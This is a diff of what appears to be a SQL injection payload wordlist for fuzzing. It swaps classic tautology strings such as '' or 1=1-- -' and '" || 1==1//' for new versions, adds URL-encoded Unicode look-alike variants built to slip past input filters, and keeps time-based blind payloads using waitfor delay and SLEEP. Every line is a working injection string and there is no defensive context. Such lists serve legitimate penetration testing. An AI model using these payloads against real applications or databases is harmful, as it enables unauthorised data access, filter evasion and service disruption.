@@ -5,15 +5,19 @@
 \u{22}
 ;
 ;%00
+%ef%bc%87
 --
 -- -
 '--
-' OR 1=1--
 0x4f52+1=1
-' OR '1
-" OR "" = "
-' OR '' = '
-' OR 1 = 1 -- -
+' or 1=1-- -
+%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3
+" or 1=1-- -
+%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3
+' || 1==1//
+%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
+" || 1==1//
+%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
 '; waitfor delay '0:30:0'--
 1; waitfor delay '0:30:0'--
 SLEEP(5) /*’ or SLEEP(5) or’” or SLEEP(5) or “*/
